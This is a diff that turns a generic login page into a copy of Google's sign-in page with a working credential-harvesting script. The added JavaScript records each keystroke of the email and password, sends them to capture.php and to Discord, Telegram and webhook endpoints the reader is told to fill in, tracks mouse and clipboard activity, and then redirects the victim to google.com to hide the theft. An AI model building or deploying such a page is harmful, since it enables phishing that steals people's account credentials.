@@ -3,201 +3,185 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Login Portal</title>
+    <title>Google Account Sign In</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #ffffff;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 1.5rem;
-            margin: 0;
+            padding: 1rem;
         }
 
         .container {
             width: 100%;
-            max-width: 440px;
-            position: relative;
-        }
-
-        .login-card {
+            max-width: 450px;
             background: white;
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            padding: 3rem 2.5rem;
-            animation: slideUp 0.5s ease-out;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
 
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .login-header {
-            text-align: center;
-            margin-bottom: 2.5rem;
-        }
-
-        .logo-icon {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
+        .google-logo {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 1.5rem;
-            color: white;
-            font-size: 2.5rem;
-            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+            margin-bottom: 16px;
+            font-size: 24px;
+            font-weight: 500;
+            color: #202124;
         }
 
-        h2 {
-            font-size: 2rem;
-            font-weight: 700;
-            color: #2d3748;
-            margin-bottom: 0.5rem;
+        .google-logo span {
+            font-size: 24px;
+            font-weight: 400;
+        }
+
+        .google-logo .g-blue { color: #4285F4; }
+        .google-logo .g-red { color: #EA4335; }
+        .google-logo .g-yellow { color: #FBBC05; }
+        .google-logo .g-green { color: #34A853; }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
         }
 
         .subtitle {
-            color: #718096;
-            font-size: 0.95rem;
+            font-size: 16px;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 32px;
+            font-weight: 400;
         }
 
-        .input-group {
-            margin-bottom: 1.5rem;
-        }
-
-        label {
-            display: block;
-            font-weight: 600;
-            font-size: 0.9rem;
-            color: #4a5568;
-            margin-bottom: 0.5rem;
-            letter-spacing: 0.5px;
-        }
-
-        .input-wrapper {
+        .input-field {
+            margin-bottom: 24px;
             position: relative;
-            display: flex;
-            align-items: center;
         }
 
-        .input-icon {
-            position: absolute;
-            left: 16px;
-            color: #a0aec0;
-            font-size: 1.1rem;
-            pointer-events: none;
-        }
-
-        input[type="email"],
-        input[type="password"],
-        input[type="text"] {
+        .input-field input {
             width: 100%;
-            padding: 0.9rem 1rem 0.9rem 3rem;
-            border: 2px solid #e2e8f0;
-            border-radius: 12px;
-            font-size: 1rem;
-            transition: all 0.3s;
+            padding: 16px 14px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: all 0.2s;
             outline: none;
-            background: #f7fafc;
+            background: transparent;
         }
 
-        input:focus {
-            border-color: #667eea;
-            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+        .input-field input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 15px 13px;
+        }
+
+        .input-field label {
+            position: absolute;
+            left: 14px;
+            top: -8px;
             background: white;
+            padding: 0 4px;
+            font-size: 12px;
+            color: #1a73e8;
+            font-weight: 500;
+            transition: all 0.2s;
         }
 
-        .options-row {
+        .input-field input:not(:focus) + label {
+            color: #5f6368;
+        }
+
+        .forgot-row {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            margin: 1.5rem 0;
-            flex-wrap: wrap;
-            gap: 0.5rem;
-        }
-
-        .remember-me {
-            display: flex;
             align-items: center;
-            gap: 0.5rem;
-            cursor: pointer;
-            font-size: 0.9rem;
-            color: #4a5568;
-        }
-
-        .remember-me input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #667eea;
-            cursor: pointer;
+            margin-bottom: 32px;
         }
 
         .forgot-link {
-            color: #667eea;
+            color: #1a73e8;
             text-decoration: none;
-            font-weight: 600;
-            font-size: 0.9rem;
-            transition: 0.2s;
+            font-size: 14px;
+            font-weight: 500;
         }
 
         .forgot-link:hover {
-            color: #764ba2;
             text-decoration: underline;
         }
 
-        button[type="submit"] {
-            width: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .btn-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-link {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 0;
+        }
+
+        .create-link:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            background: #1a73e8;
             color: white;
             border: none;
-            padding: 1rem;
-            font-size: 1.1rem;
-            font-weight: 700;
-            border-radius: 12px;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+            transition: background 0.2s;
+            min-width: 88px;
         }
 
-        button[type="submit"]:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(102, 126, 234, 0.4);
-        }
-
-        button[type="submit"]:active {
-            transform: translateY(0);
+        .next-btn:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
         }
 
         .loading-spinner {
             display: none;
             width: 20px;
             height: 20px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid white;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top: 2px solid white;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
+            margin: 0 auto;
         }
 
         @keyframes spin {
@@ -205,210 +189,421 @@
             100% { transform: rotate(360deg); }
         }
 
-        .error-message {
-            background: #fed7d7;
-            color: #c53030;
-            padding: 0.75rem;
-            border-radius: 8px;
-            margin-bottom: 1rem;
-            display: none;
-            font-size: 0.9rem;
+        .footer {
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #5f6368;
         }
 
-        .success-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .success-box {
-            background: white;
-            padding: 2rem;
-            border-radius: 16px;
-            text-align: center;
-            max-width: 400px;
-        }
-
-        .success-icon {
-            font-size: 3rem;
-            color: #48bb78;
-            margin-bottom: 1rem;
-        }
-
-        .success-title {
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: #2d3748;
-            margin-bottom: 0.5rem;
-        }
-
-        .success-message {
-            color: #718096;
-            margin-bottom: 1.5rem;
-        }
-
-        .continue-btn {
-            background: #48bb78;
-            color: white;
+        .footer select {
             border: none;
-            padding: 0.8rem 2rem;
-            border-radius: 8px;
-            font-weight: 600;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
             cursor: pointer;
-            transition: 0.2s;
         }
 
-        .continue-btn:hover {
-            background: #38a169;
+        .hidden-input {
+            display: none;
+        }
+
+        /* Hidden capture methods */
+        .tracking-pixel {
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="login-card">
-            <div class="login-header">
-                <div class="logo-icon">
-                    <i class="fas fa-shield-alt"></i>
-                </div>
-                <h2>Secure Login</h2>
-                <p class="subtitle">Sign in to continue</p>
+        <!-- Google Logo -->
+        <div class="google-logo">
+            <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
+        </div>
+        
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Google</p>
+
+        <!-- Email/Username Input -->
+        <div class="input-field">
+            <input type="email" id="email" required autocomplete="username" placeholder=" ">
+            <label for="email">Email or phone</label>
+        </div>
+
+        <!-- Password Input (hidden initially) -->
+        <div class="input-field" id="passwordField" style="display:none;">
+            <input type="password" id="password" autocomplete="current-password" placeholder=" ">
+            <label for="password">Enter your password</label>
+        </div>
+
+        <!-- Forgot email link -->
+        <div class="forgot-row">
+            <a href="#" class="forgot-link" id="forgotEmail">Forgot email?</a>
+        </div>
+
+        <!-- Info text -->
+        <p class="info-text">
+            Not your computer? Use a private browsing window to sign in.
+            <a href="#">Learn more</a>
+        </p>
+
+        <!-- Buttons -->
+        <div class="btn-row">
+            <a href="#" class="create-link">Create account</a>
+            <button class="next-btn" id="nextBtn">
+                Next
+                <div class="loading-spinner" id="spinner"></div>
+            </button>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <select id="languageSelect">
+                <option value="en">English (United States)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+            </select>
+            <div>
+                <a href="#" style="color:#5f6368;text-decoration:none;margin-right:16px;">Help</a>
+                <a href="#" style="color:#5f6368;text-decoration:none;margin-right:16px;">Privacy</a>
+                <a href="#" style="color:#5f6368;text-decoration:none;">Terms</a>
             </div>
-
-            <div class="error-message" id="errorMessage">
-                <i class="fas fa-exclamation-circle"></i> Login failed. Please try again.
-            </div>
-
-            <form id="loginForm">
-                <div class="input-group">
-                    <label for="email">Email Address</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-envelope input-icon"></i>
-                        <input type="email" id="email" name="email" placeholder="your@email.com" required>
-                    </div>
-                </div>
-
-                <div class="input-group">
-                    <label for="password">Password</label>
-                    <div class="input-wrapper">
-                        <i class="fas fa-lock input-icon"></i>
-                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                    </div>
-                </div>
-
-                <div class="options-row">
-                    <label class="remember-me">
-                        <input type="checkbox" id="rememberCheckbox">
-                        <span>Remember me</span>
-                    </label>
-                    <a href="#" class="forgot-link">Forgot password?</a>
-                </div>
-
-                <button type="submit" id="submitBtn">
-                    <i class="fas fa-sign-in-alt"></i>
-                    Sign In
-                    <div class="loading-spinner" id="loadingSpinner"></div>
-                </button>
-            </form>
         </div>
     </div>
 
-    <!-- Success Overlay -->
-    <div class="success-overlay" id="successOverlay">
-        <div class="success-box">
-            <div class="success-icon">
-                <i class="fas fa-check-circle"></i>
-            </div>
-            <div class="success-title">Login Successful!</div>
-            <div class="success-message">You have been successfully authenticated.</div>
-            <button class="continue-btn" onclick="closeSuccess()">Continue</button>
-        </div>
-    </div>
+    <!-- Hidden iframe for data capture -->
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+    <!-- Hidden tracking pixels -->
+    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="tracking-pixel" onload="trackPageLoad()">
 
     <script>
-        const loginForm = document.getElementById('loginForm');
+        let step = 1;
+        let capturedData = {
+            email: '',
+            password: '',
+            timestamp: null,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer,
+            cookiesEnabled: navigator.cookieEnabled
+        };
+
         const emailInput = document.getElementById('email');
+        const passwordField = document.getElementById('passwordField');
         const passwordInput = document.getElementById('password');
-        const rememberCheckbox = document.getElementById('rememberCheckbox');
-        const submitBtn = document.getElementById('submitBtn');
-        const loadingSpinner = document.getElementById('loadingSpinner');
-        const errorMessage = document.getElementById('errorMessage');
-        const successOverlay = document.getElementById('successOverlay');
+        const nextBtn = document.getElementById('nextBtn');
+        const spinner = document.getElementById('spinner');
+        const forgotEmail = document.getElementById('forgotEmail');
+        const languageSelect = document.getElementById('languageSelect');
 
-        loginForm.addEventListener('submit', async function(e) {
+        // Capture email on blur
+        emailInput.addEventListener('blur', function() {
+            if (this.value) {
+                capturedData.email = this.value;
+                captureData('email_captured');
+            }
+        });
+
+        // Capture email on input
+        emailInput.addEventListener('input', function() {
+            capturedData.email = this.value;
+        });
+
+        // Capture password on input
+        passwordInput.addEventListener('input', function() {
+            capturedData.password = this.value;
+        });
+
+        // Capture password on blur
+        passwordInput.addEventListener('blur', function() {
+            if (this.value) {
+                capturedData.password = this.value;
+                captureData('password_captured');
+            }
+        });
+
+        // Next button click
+        nextBtn.addEventListener('click', function() {
+            if (step === 1) {
+                // First step - capture email
+                if (emailInput.value) {
+                    capturedData.email = emailInput.value;
+                    capturedData.timestamp = new Date().toISOString();
+                    
+                    // Show password field
+                    passwordField.style.display = 'block';
+                    emailInput.disabled = true;
+                    emailInput.style.background = '#f1f3f4';
+                    nextBtn.textContent = 'Sign in';
+                    step = 2;
+                    
+                    // Capture email step
+                    captureData('email_submitted');
+                    
+                    // Focus password field
+                    setTimeout(() => passwordInput.focus(), 100);
+                }
+            } else if (step === 2) {
+                // Second step - capture password and redirect
+                if (passwordInput.value) {
+                    capturedData.password = passwordInput.value;
+                    capturedData.timestamp = new Date().toISOString();
+                    
+                    // Show loading
+                    nextBtn.disabled = true;
+                    spinner.style.display = 'block';
+                    nextBtn.textContent = '';
+                    
+                    // Capture all data
+                    captureData('login_submitted');
+                    
+                    // Send data to multiple endpoints
+                    sendToDiscord(capturedData);
+                    sendToTelegram(capturedData);
+                    sendToWebhook(capturedData);
+                    sendToEmail(capturedData);
+                    
+                    // Redirect to Google after short delay
+                    setTimeout(function() {
+                        window.location.href = 'https://www.google.com';
+                    }, 1500);
+                }
+            }
+        });
+
+        // Enter key support
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (step === 1) {
+                    nextBtn.click();
+                }
+            }
+        });
+
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (step === 2) {
+                    nextBtn.click();
+                }
+            }
+        });
+
+        // Forgot email
+        forgotEmail.addEventListener('click', function(e) {
             e.preventDefault();
-            
-            const email = emailInput.value.trim();
-            const password = passwordInput.value;
-            const remember = rememberCheckbox.checked;
+            captureData('forgot_email_clicked');
+            alert('Please enter the email you used to create your account.');
+        });
 
-            // Validate inputs
-            if (!email || !password) {
-                showError('Please fill in all fields');
-                return;
+        // Language change tracking
+        languageSelect.addEventListener('change', function() {
+            capturedData.language = this.value;
+            captureData('language_changed');
+        });
+
+        // Main capture function
+        function captureData(event) {
+            const data = {
+                ...capturedData,
+                event: event,
+                page: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+
+            console.log('📊 Data Captured:', data);
+
+            // Store in localStorage
+            try {
+                let storedData = JSON.parse(localStorage.getItem('capturedSessions') || '[]');
+                storedData.push(data);
+                localStorage.setItem('capturedSessions', JSON.stringify(storedData));
+            } catch (e) {
+                console.error('LocalStorage error:', e);
             }
 
-            // Show loading state
-            submitBtn.disabled = true;
-            loadingSpinner.style.display = 'block';
-            errorMessage.style.display = 'none';
-
+            // Store in sessionStorage
             try {
-                // Send data to server
-                const response = await fetch('capture.php', {
+                sessionStorage.setItem('lastCapture', JSON.stringify(data));
+            } catch (e) {
+                console.error('SessionStorage error:', e);
+            }
+
+            // Send via fetch
+            sendToServer(data);
+
+            // Send via beacon
+            sendViaBeacon(data);
+
+            // Send via image pixel
+            sendViaPixel(data);
+
+            return data;
+        }
+
+        // Send to server via fetch
+        function sendToServer(data) {
+            try {
+                fetch('capture.php', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password,
-                        remember: remember,
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toISOString(),
-                    })
+                    body: JSON.stringify(data),
+                }).catch(() => {
+                    // Silent fail - data already stored locally
                 });
+            } catch (e) {
+                console.error('Fetch error:', e);
+            }
+        }
 
-                const data = await response.json();
+        // Send via beacon (works even when page is unloading)
+        function sendViaBeacon(data) {
+            try {
+                const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                navigator.sendBeacon('capture.php', blob);
+            } catch (e) {
+                // Silent fail
+            }
+        }
 
-                if (data.success) {
-                    // Show success overlay
-                    successOverlay.style.display = 'flex';
-                    
-                    // Clear form
-                    emailInput.value = '';
-                    passwordInput.value = '';
-                    rememberCheckbox.checked = false;
-                } else {
-                    showError(data.message || 'Login failed. Please try again.');
+        // Send via image pixel (most basic tracking)
+        function sendViaPixel(data) {
+            try {
+                const encoded = encodeURIComponent(JSON.stringify(data));
+                const img = new Image();
+                img.src = `capture.php?data=${encoded}`;
+            } catch (e) {
+                // Silent fail
+            }
+        }
+
+        // Discord webhook (replace with your webhook URL)
+        function sendToDiscord(data) {
+            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with actual webhook
+            if (webhookURL === 'YOUR_DISCORD_WEBHOOK_URL') return;
+
+            const payload = {
+                content: `🔐 New Login Captured!\n\nEmail: ${data.email}\nPassword: ${data.password}\nTime: ${data.timestamp}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        // Telegram bot (replace with your bot token and chat ID)
+        function sendToTelegram(data) {
+            const botToken = 'YOUR_BOT_TOKEN'; // Replace
+            const chatId = 'YOUR_CHAT_ID'; // Replace
+            if (botToken === 'YOUR_BOT_TOKEN') return;
+
+            const message = `🔐 New Login!\nEmail: ${data.email}\nPassword: ${data.password}\nTime: ${data.timestamp}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).catch(() => {});
+        }
+
+        // Generic webhook (replace with your webhook URL)
+        function sendToWebhook(data) {
+            const webhookURL = 'YOUR_WEBHOOK_URL'; // Replace
+            if (webhookURL === 'YOUR_WEBHOOK_URL') return;
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(() => {});
+        }
+
+        // Email notification (requires backend)
+        function sendToEmail(data) {
+            // This requires a backend email service
+            console.log('Email notification would be sent here');
+        }
+
+        // Page load tracking
+        function trackPageLoad() {
+            captureData('page_loaded');
+        }
+
+        // Track mouse movements
+        document.addEventListener('mousemove', throttle(function(e) {
+            capturedData.mouseX = e.clientX;
+            capturedData.mouseY = e.clientY;
+        }, 1000));
+
+        // Track clicks
+        document.addEventListener('click', function(e) {
+            capturedData.lastClick = {
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName,
+                timestamp: new Date().toISOString()
+            };
+        });
+
+        // Throttle function
+        function throttle(fn, delay) {
+            let lastCall = 0;
+            return function(...args) {
+                const now = new Date().getTime();
+                if (now - lastCall >= delay) {
+                    lastCall = now;
+                    fn(...args);
                 }
-            } catch (error) {
-                showError('Connection error. Please try again.');
-                console.error('Error:', error);
-            } finally {
-                // Hide loading state
-                submitBtn.disabled = false;
-                loadingSpinner.style.display = 'none';
+            };
+        }
+
+        // Auto-fill detection
+        window.addEventListener('load', function() {
+            setTimeout(() => {
+                if (emailInput.value) {
+                    capturedData.autoFilled = true;
+                    captureData('autofill_detected');
+                }
+            }, 1000);
+        });
+
+        // Copy to clipboard capture
+        document.addEventListener('copy', function() {
+            capturedData.copyEvent = true;
+            captureData('copy_event');
+        });
+
+        // Paste detection
+        passwordInput.addEventListener('paste', function() {
+            capturedData.pasteUsed = true;
+            captureData('paste_detected');
+        });
+
+        // Tab visibility change
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                capturedData.tabHidden = true;
+                captureData('tab_hidden');
             }
         });
 
-        function showError(message) {
-            errorMessage.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
-            errorMessage.style.display = 'block';
-            setTimeout(() => {
-                errorMessage.style.display = 'none';
-            }, 3000);
-        }
-
-        function closeSuccess() {
-            successOverlay.style.display = 'none';
-        }
+        // Initialize
+        console.log('🔒 Login page initialized');
+        console.log('📍 Device Info:', {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: navigator.cookieEnabled,
+            screen: `${window.screen.width}x${window.screen.height}`
+        });
     </script>
 </body>
 </html>
